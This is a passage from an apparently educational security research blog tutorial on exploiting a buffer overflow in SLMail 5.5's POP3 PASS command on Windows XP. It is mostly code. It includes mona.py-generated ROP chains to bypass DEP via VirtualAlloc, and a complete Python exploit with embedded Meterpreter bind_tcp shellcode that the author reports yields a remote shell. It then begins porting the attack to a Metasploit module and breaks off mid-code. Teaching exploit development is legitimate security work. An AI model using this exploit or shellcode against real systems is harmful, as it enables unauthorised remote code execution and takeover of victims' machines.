<figure class="wp-block-image size-large"><img data-attachment-id="7748" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/e/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/e.png?fit=724%2C281&amp;ssl=1" data-orig-size="724,281" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="e" data-image-description data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/e.png?fit=300%2C116&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/e.png?fit=724%2C281&amp;ssl=1" loading="lazy" width="724" height="281" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/e.png?resize=724%2C281&#038;ssl=1" alt class="wp-image-7748 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/e.png?w=724&amp;ssl=1 724w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/e.png?resize=300%2C116&amp;ssl=1 300w" data-lazy-sizes="(max-width: 724px) 100vw, 724px" data-lazy-src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/e.png?resize=724%2C281&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7748" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/e/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/e.png?fit=724%2C281&amp;ssl=1" data-orig-size="724,281" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="e" data-image-description="" data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/e.png?fit=300%2C116&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/e.png?fit=724%2C281&amp;ssl=1" loading="lazy" width="724" height="281" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/e.png?resize=724%2C281&#038;ssl=1" alt="" class="wp-image-7748" srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/e.png?w=724&amp;ssl=1 724w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/e.png?resize=300%2C116&amp;ssl=1 300w" sizes="(max-width: 724px) 100vw, 724px" data-recalc-dims="1" /></noscript></figure>



<p>The parameters are the starting address of the region to allocate, the size of the region in bytes, the type of allocation, and the memory protection for that region.</p>



<p>If we put “0x40” (PAGE_EXECUTE_READWRITE) in the last parameter, we could execute code in that memory region.</p>



<p>A description of VirtualProtect can be found at&nbsp;<a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa366898(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/windows/desktop/aa366898(v=vs.85).aspx</a></p>



<p>VirtualProtect changes the protection on a region of committed pages in the virtual address space of the calling process.</p>



<p><strong>Syntax</strong></p>



<figure class="wp-block-image size-large"><img data-attachment-id="7749" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/f/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/f.png?fit=720%2C244&amp;ssl=1" data-orig-size="720,244" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="f" data-image-description data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/f.png?fit=300%2C102&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/f.png?fit=720%2C244&amp;ssl=1" loading="lazy" width="720" height="244" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/f.png?resize=720%2C244&#038;ssl=1" alt class="wp-image-7749 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/f.png?w=720&amp;ssl=1 720w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/f.png?resize=300%2C102&amp;ssl=1 300w" data-lazy-sizes="(max-width: 720px) 100vw, 720px" data-lazy-src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/f.png?resize=720%2C244&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7749" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/f/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/f.png?fit=720%2C244&amp;ssl=1" data-orig-size="720,244" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="f" data-image-description="" data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/f.png?fit=300%2C102&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/f.png?fit=720%2C244&amp;ssl=1" loading="lazy" width="720" height="244" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/f.png?resize=720%2C244&#038;ssl=1" alt="" class="wp-image-7749" srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/f.png?w=720&amp;ssl=1 720w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/f.png?resize=300%2C102&amp;ssl=1 300w" sizes="(max-width: 720px) 100vw, 720px" data-recalc-dims="1" /></noscript></figure>



<p>Here we pass a pointer to an address that describes the start of the region, the size in bytes of the region whose protection attributes are to be changed, the type of protection desired (0x40), and a pointer to a variable that receives the current protection value. Ifs this parameter is null or points to a non-valid address the function fails.</p>



<p>After the theory about ROP and Windows API functions, let’s see how to use this to write an exploit with the help of mona.py.</p>



<p>We call “!mona rop” in Immunity Debugger, creating the files rop.txt, rop_chains.txt, rop_suggestions.txt, and stackpivot.txt at c:\logs\slmail\.</p>



<p>In rop_chains.txt you can find some ready-to-use functions to make a rop chain calling VirtualAlloc or VirtualProtect to change the protection of the stack. You are going to need this in your exploit, and mona.py gives it to you in the form of functions in Python, Ruby, or other languages.</p>



<p>This is the Python function generated by mona.py to use VirtualAlloc in our exploit:</p>



<pre class="wp-block-code"><code>def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = &#91;
      0x0041c323,  # POP EAX # RETN &#91;SLmail.exe]
      0x5d091330,  # ptr to &amp;VirtualAlloc() (skipped module criteria, check if pointer is reliable !) &#91;IAT COMCTL32.dll]
      0x00422ce9,  # MOV EAX,DWORD PTR DS:&#91;EAX+4] # RETN &#91;SLmail.exe]
      0x004155f2,  # PUSH EAX # ADD EAX,E2EB0000 # MOV EAX,ESI # POP ESI # RETN &#91;SLmail.exe]
      0x00426fd1,  # POP EBP # RETN &#91;SLmail.exe]
      0x00000000,  # &amp;  &#91;Unable to find ptr to 'JMP ESP']
      0x00432593,  # POP EBX # RETN &#91;SLmail.exe]
      0x00000001,  # 0x00000001-&gt; ebx
      0x00000000,  # &#91;-] Unable to find gadget to put 00001000 into edx
      0x004017c9,  # POP ECX # RETN &#91;SLmail.exe]
      0x00000040,  # 0x00000040-&gt; ecx
      0x004233f0,  # POP EDI # RETN &#91;SLmail.exe]
      0x004233f1,  # RETN (ROP NOP) &#91;SLmail.exe]
      0x0041592e,  # POP EAX # RETN &#91;SLmail.exe]
      0x90909090,  # nop
      0x00000000,  # &#91;-] Unable to find pushad gadget
    ]
    return ''.join(struct.pack('&lt;I', _) for _ in rop_gadgets)</code></pre>



<p>This ROP chain is not going to work in our exploit because there are some gadgets missing and because of the bad characters.</p>



<p>By default mona.py excludes the OS DLLs when looking for gadgets to make exploits more reliable, but if no valid gadgets are found we can force mona.py to include them with the -m option.</p>



<p>So we call the following command:</p>



<pre class="wp-block-code"><code>!mona rop -cpb ‘\x00\x0a\x0d’ -m msvcrt.dll</code></pre>



<p>This is the Python function generated in rop_chains.txt:</p>



<pre class="wp-block-code"><code>def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = &#91;
      0x77c4c5cd,  # POP EBP # RETN &#91;msvcrt.dll]
      0x77c4c5cd,  # skip 4 bytes &#91;msvcrt.dll]
      0x77c46e97,  # POP EBX # RETN &#91;msvcrt.dll]
      0xffffffff,  # 
      0x77c127e5,  # INC EBX # RETN &#91;msvcrt.dll]
      0x77c127e1,  # INC EBX # RETN &#91;msvcrt.dll]
      0x77c4debf,  # POP EAX # RETN &#91;msvcrt.dll]
      0x2cfe1467,  # put delta into eax (-&gt; put 0x00001000 into edx)
      0x77c4eb80,  # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN &#91;msvcrt.dll]
      0x77c58fbc,  # XCHG EAX,EDX # RETN &#91;msvcrt.dll]
      0x77c4e0da,  # POP EAX # RETN &#91;msvcrt.dll]
      0x2cfe04a7,  # put delta into eax (-&gt; put 0x00000040 into ecx)
      0x77c4eb80,  # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN &#91;msvcrt.dll]
      0x77c14001,  # XCHG EAX,ECX # RETN &#91;msvcrt.dll]
      0x77c2e93d,  # POP EDI # RETN &#91;msvcrt.dll]
      0x77c47a42,  # RETN (ROP NOP) &#91;msvcrt.dll]
      0x77c2eb03,  # POP ESI # RETN &#91;msvcrt.dll]
      0x77c2aacc,  # JMP &#91;EAX] &#91;msvcrt.dll]
      0x77c4ded4,  # POP EAX # RETN &#91;msvcrt.dll]
      0x77c1110c,  # ptr to &amp;VirtualAlloc() &#91;IAT msvcrt.dll]
      0x77c12df9,  # PUSHAD # RETN &#91;msvcrt.dll]
      0x77c35459,  # ptr to 'push esp # ret ' &#91;msvcrt.dll]
    ]
    return ''.join(struct.pack('&lt;I', _) for _ in rop_gadgets)</code></pre>



<p>As can be seen, there are no missing pointers causing errors, and the opcodes do not contain bad characters.</p>



<p>This ROP chain to VirtualAlloc is going to make the stack executable, so we could execute our shellcode like when DEP was in OptIn mode (OptIn is only enabled for essential Windows programs and processes).</p>



<p>We add the chain just before the first instruction we need to execute on the stack.</p>



<p>Before the new exploit is finished, we must change the instruction we put in EIP for a ret instruction that loads in EIP the next pointer in the stack. Remember we use a jmp esp instruction, but now we can’t execute code in the stack, so when the jump lands in the stack, the data there are not opcodes, so it is not going to work. We can look in rop.txt for gadgets to use:</p>



<pre class="wp-block-code"><code>0x77c46027 :  # POP ECX # RETN    ** &#91;msvcrt.dll] **   |   {PAGE_EXECUTE_READ}</code></pre>



<p>The gadget above extracts the first value in the stack to ECX and then makes a RET that loads the following value onto the stack on EIP. That means that we need to put four bytes between the EIP and the rop chain to avoid the first gadget of the chain being removed.</p>



<p>Here is the entire exploit.</p>



<pre class="wp-block-code"><code># DEP Bypass POC
import sys
import socket
import struct

 

#0x77c46027 :  # POP ECX # RETN    ** &#91;msvcrt.dll] ** 
EIP = struct.pack('&lt;I', 0x77c46027)
move_esp = \x81\xc4\xc0\xfd\xff\xff # add esp,-240h

# Metasploit meterpreter/bind_tcp LPORT=4444 LHOST=192.168.65.176
shellcode = (
\xba\xcc\x95\x04\x48\xd9\xc8\xd9\x74\x24\xf4\x5b\x31\xc9\xb1
\x4c\x83\xc3\x04\x31\x53\x0f\x03\x53\xc3\x77\xf1\xb4\x33\xf5
\xfa\x44\xc3\x9a\x73\xa1\xf2\x9a\xe0\xa1\xa4\x2a\x62\xe7\x48
\xc0\x26\x1c\xdb\xa4\xee\x13\x6c\x02\xc9\x1a\x6d\x3f\x29\x3c
\xed\x42\x7e\x9e\xcc\x8c\x73\xdf\x09\xf0\x7e\x8d\xc2\x7e\x2c
\x22\x67\xca\xed\xc9\x3b\xda\x75\x2d\x8b\xdd\x54\xe0\x80\x87
\x76\x02\x45\xbc\x3e\x1c\x8a\xf9\x89\x97\x78\x75\x08\x7e\xb1
\x76\xa7\xbf\x7e\x85\xb9\xf8\xb8\x76\xcc\xf0\xbb\x0b\xd7\xc6
\xc6\xd7\x52\xdd\x60\x93\xc5\x39\x91\x70\x93\xca\x9d\x3d\xd7
\x95\x81\xc0\x34\xae\xbd\x49\xbb\x61\x34\x09\x98\xa5\x1d\xc9
\x81\xfc\xfb\xbc\xbe\x1f\xa4\x61\x1b\x6b\x48\x75\x16\x36\x04
\xba\x1b\xc9\xd4\xd4\x2c\xba\xe6\x7b\x87\x54\x4a\xf3\x01\xa2
\xad\x2e\xf5\x3c\x50\xd1\x06\x14\x96\x85\x56\x0e\x3f\xa6\x3c
\xce\xc0\x73\xa8\xc6\x67\x2c\xcf\x2a\xd7\x9c\x4f\x85\xbf\xf6
\x5f\xfa\xdf\xf8\xb5\x93\x77\x05\x36\x8d\xdb\x80\xd0\xc7\xf3
\xc4\x4b\x70\x31\x33\x44\xe7\x4a\x11\x2e\x27\xc1\xca\x66\xc0
\x9e\x02\xb0\xef\x1f\x01\x96\x67\xab\x46\x22\x99\xac\x42\xc2
\x33\x52\x07\xe9\x95\x05\xbf\xf3\xc0\x61\x60\x0b\x27\xf2\x67
\xf3\xb6\xd9\x1c\xc2\x2c\x61\x4b\x2b\xa1\x61\x8b\x7d\xab\x61
\xe3\xd9\x8f\x32\x16\x26\x1a\x27\x8b\xb3\xa5\x11\x7f\x13\xce
\x9f\xa6\x53\x51\x60\x8d\xe7\x96\x9e\x50\xef\x67\x5d\x85\x29
\x12\x88\x15\x0e\x2d\xff\x38\x27\xa4\xff\x6f\x37\xed
)

def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = &#91;
      0x77c4c5cd,  # POP EBP # RETN &#91;msvcrt.dll]
      0x77c4c5cd,  # skip 4 bytes &#91;msvcrt.dll]
      0x77c46e97,  # POP EBX # RETN &#91;msvcrt.dll]
      0xffffffff,  # 
      0x77c127e5,  # INC EBX # RETN &#91;msvcrt.dll]
      0x77c127e1,  # INC EBX # RETN &#91;msvcrt.dll]
      0x77c4debf,  # POP EAX # RETN &#91;msvcrt.dll]
      0x2cfe1467,  # put delta into eax (-&gt; put 0x00001000 into edx)
      0x77c4eb80,  # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN &#91;msvcrt.dll]
      0x77c58fbc,  # XCHG EAX,EDX # RETN &#91;msvcrt.dll]
      0x77c4e0da,  # POP EAX # RETN &#91;msvcrt.dll]
      0x2cfe04a7,  # put delta into eax (-&gt; put 0x00000040 into ecx)
      0x77c4eb80,  # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN &#91;msvcrt.dll]
      0x77c14001,  # XCHG EAX,ECX # RETN &#91;msvcrt.dll]
      0x77c2e93d,  # POP EDI # RETN &#91;msvcrt.dll]
      0x77c47a42,  # RETN (ROP NOP) &#91;msvcrt.dll]
      0x77c2eb03,  # POP ESI # RETN &#91;msvcrt.dll]
      0x77c2aacc,  # JMP &#91;EAX] &#91;msvcrt.dll]
      0x77c4ded4,  # POP EAX # RETN &#91;msvcrt.dll]
      0x77c1110c,  # ptr to &amp;VirtualAlloc() &#91;IAT msvcrt.dll]
      0x77c12df9,  # PUSHAD # RETN &#91;msvcrt.dll]
      0x77c35459,  # ptr to 'push esp # ret ' &#91;msvcrt.dll]
    ]
    return ''.join(struct.pack('&lt;I', _) for _ in rop_gadgets)

buffer_lenght = 6000
buffer = 'A' * 4654
buffer += EIP
buffer += ‘\xff\xff\xff\xff’ # paddign to put in ECX
buffer += create_rop_chain()
buffer += move_esp
buffer += shellcode
buffer += 'C' * (buffer_lenght-len(buffer))

HOST = '127.0.0.1'
PORT = 110
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
data = s.recv(1024)
s.send('USER username'+'\r\n')
data = s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.close()</code></pre>



<p>Now, let’s try the new version of the exploit. Once executed we can see the following in a command prompt:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7750" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/14-2/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/14.png?fit=697%2C298&amp;ssl=1" data-orig-size="697,298" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="14" data-image-description data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/14.png?fit=300%2C128&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/14.png?fit=697%2C298&amp;ssl=1" loading="lazy" width="697" height="298" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/14.png?resize=697%2C298&#038;ssl=1" alt class="wp-image-7750 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/14.png?w=697&amp;ssl=1 697w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/14.png?resize=300%2C128&amp;ssl=1 300w" data-lazy-sizes="(max-width: 697px) 100vw, 697px" data-lazy-src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/14.png?resize=697%2C298&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7750" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/14-2/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/14.png?fit=697%2C298&amp;ssl=1" data-orig-size="697,298" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="14" data-image-description="" data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/14.png?fit=300%2C128&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/14.png?fit=697%2C298&amp;ssl=1" loading="lazy" width="697" height="298" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/14.png?resize=697%2C298&#038;ssl=1" alt="" class="wp-image-7750" srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/14.png?w=697&amp;ssl=1 697w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/14.png?resize=300%2C128&amp;ssl=1 300w" sizes="(max-width: 697px) 100vw, 697px" data-recalc-dims="1" /></noscript></figure>



<p>And now let’s try to connect from Kali Linux:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7751" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/15-2/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/15.png?fit=975%2C464&amp;ssl=1" data-orig-size="975,464" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="15" data-image-description data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/15.png?fit=300%2C143&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/15.png?fit=975%2C464&amp;ssl=1" loading="lazy" width="975" height="464" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/15.png?resize=975%2C464&#038;ssl=1" alt class="wp-image-7751 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/15.png?w=975&amp;ssl=1 975w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/15.png?resize=300%2C143&amp;ssl=1 300w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/15.png?resize=768%2C365&amp;ssl=1 768w" data-lazy-sizes="(max-width: 975px) 100vw, 975px" data-lazy-src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/15.png?resize=975%2C464&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7751" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/15-2/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/15.png?fit=975%2C464&amp;ssl=1" data-orig-size="975,464" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="15" data-image-description="" data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/15.png?fit=300%2C143&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/15.png?fit=975%2C464&amp;ssl=1" loading="lazy" width="975" height="464" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/15.png?resize=975%2C464&#038;ssl=1" alt="" class="wp-image-7751" srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/15.png?w=975&amp;ssl=1 975w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/15.png?resize=300%2C143&amp;ssl=1 300w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/15.png?resize=768%2C365&amp;ssl=1 768w" sizes="(max-width: 975px) 100vw, 975px" data-recalc-dims="1" /></noscript></figure>



<p>As we can see, we have a Meterpreter shell on the remote Windows box.</p>



<p>Pwned!!!! again.</p>



<h2>From exploit to Metasploit</h2>



<p>Once we have our Python exploit working on systems with DEP and with no DEP, it’s time to port it to a Metasploit module. With the Metasploit module the process of exploiting this vulnerability will be fully automated.</p>



<p>Metasploit has its own modules by default on /usr/share/metasploit-framework/modules/. Here there is a folder structure for each class of module (e.g. exploits/windows/httpd) and inside these folders are the exploit files (such as &nbsp;shttpd_post.rb).</p>



<p>There are two ways of adding modules to Metasploit. You can put your own exploit files in this folder structure; but this is not recommended because when Metasploit updates you may lose your exploits. The other way is to create the same folder structure inside the .msf4 folder in the user’s home directory.</p>



<p>In this case, to add a module to Metasploit we are going to create the file slmail_pass.rb in the folder $HOME/.msf4/modules/exploits/windows/pop3/.</p>



<pre class="wp-block-code"><code>mkdir  .msf4/modules
mkdir .msf4/modules/exploits
mkdir .msf4/modules/exploits/pop3
touch .msf4/modules/exploits/pop3/slmail_pass.rb</code></pre>



<p>Next, we can copy the Metasploit exploit skeleton inside the file slmail_pass.rb. The next skeleton is available at&nbsp;<a href="http://www.offensive-security.com/metasploit-unleashed/Exploit_Format">http://www.offensive-security.com/metasploit-unleashed/Exploit_Format</a>:</p>



<pre class="wp-block-code"><code>require ‘msf/core’

class Metasploit3 &lt; Msf::Exploit::Remote

      include Msf::Exploit::Remote::Tcp

      def initialize
           super(
               'Name'          =&gt; 'Simplified Exploit Module',
               'Description'   =&gt; 'This module sends a payload',
               'Author'        =&gt; 'My Name Here',
               'Payload'       =&gt; {'Space' =&gt; 1024, 'BadChars' =&gt; \x00},
               'Targets'       =&gt; &#91; &#91;'Automatic', {} ] ],
               'Platform'      =&gt; 'win',
           )
           register_options( &#91;
               Opt::RPORT(12345)
           ], self.class)
      end

      # Connect to port, send the payload, handle it, disconnect
      def exploit
           connect()
           sock.put(payload.encoded)
           handler()
           disconnect()
      end
end</code></pre>



<p>Every module needs at least two functions: “initialize” and “exploit”. There is a third and optional function “check”, which is used to fingerprint the victim box and check whether or not it is vulnerable to the exploit. Apart from this you can define more auxiliary functions to help achieve your goal, just like any Python or Ruby script.</p>



<p>Like Python, the indentation in Ruby is very important. Metasploit modules used to use two blank spaces instead of tabulations to indent (it is advisable to set the text editor of your choice to use two spaces when you press tab).</p>



<p>Here’s an example .vimrc file to set up a Vim editor:</p>



<pre class="wp-block-code"><code>filetype indent plugin on

syntax on
set shiftwidth=2
set softtabstop=2
set expandtab</code></pre>



<p>If you use this .vimrc file, and you try to paste the exploit skeleton into a file using Vim, each new line you paste will be indented, and the exploit will lose the format. To solve this, you need to execute the “:set paste” command before you paste the content to the file. Once pasted, if the indent is more than two spaces you can type “gg=G” to re-indent the file using the configured values.</p>



<p>The line “include Msf::Exploit::Remote::TCP” is a Mixin which lets you include classes inside classes. Mixins add new functions and let you overload existing functions, changing their behavior.</p>



<p>Metasploit has many ready-to-use Mixins, which you can find in the folder lib/msf/core/ inside the Metasploit parent folder.</p>



<p>You can find lots of information about Mixins on the Internet, for example at</p>



<p><a href="http://www.offensive-security.com/metasploit-unleashed/Exploit_Mixins" rel="nofollow">http://www.offensive-security.com/metasploit-unleashed/Exploit_Mixins</a>, or simply by looking into the source code:</p>



<p>Some Metasploit Mixins are:</p>



<ul><li>Exploit::Remote::Tcp (lib/msf/core/exploit/tcp.rb)</li><li>Exploit::Remote::DCERPC (lib/msf/core/exploit/dcerpc.rb)</li><li>Exploit::Remote::SMB (lib/msf/core/exploit/smb.rb)</li><li>Exploit::Remote::BruteTargets (lib/msf/core/exploit/brutetargets.rb &#8212; lib/msf/core/exploit/brute.rb)</li><li>Exploit::Remote::HttpClient (lib/msf/core/exploit/http/client.rb)</li><li>Exploit::Remote::FILEFORMAT (lib/msf/core/exploit/fileformat.rb)</li><li>Exploit::Remote::Egghunter (lib/msf/core/exploit/egghunter.rb)</li><li>Exploit::Remote::Omelet (lib/msf/core/exploit/omelet.rb)</li><li>Exploit::Remote::Seh (lib/msf/core/exploit/seh.rb)</li></ul>



<p>Now to port our exploit into Metasploit. First we are going to modify the initialize function with the information about our exploit:</p>



<pre class="wp-block-code"><code>def initialize
           super(
               'Name'          =&gt; 'SLMail 5.5 Pop3 Pass Exploit Module',
               'Description'   =&gt; 'This module exploits a buffer overflow when sending password on pop3 server',
               'Author'        =&gt; 'Nacho Sorribas',
               'Payload'       =&gt; {'Space' =&gt; 332, 'BadChars' =&gt; \x00\x0a\x0d},
               'Targets'       =&gt;
                                                   &#91;
                                                                &#91;'Windows XP SP3 English',
                                                                                {

                                                                                                'Ret' =&gt; 0x77c46027, #0x77c46027 :  # POP ECX # RETN    ** &#91;msvcrt.dll] **

                                                                                                'OffSet' =&gt; 4654,

 

                                                                                }
                                                                ]
                                                   ],
               'Platform'      =&gt; 'win',
           )
           register_options( &#91;
               Opt::RPORT(110)
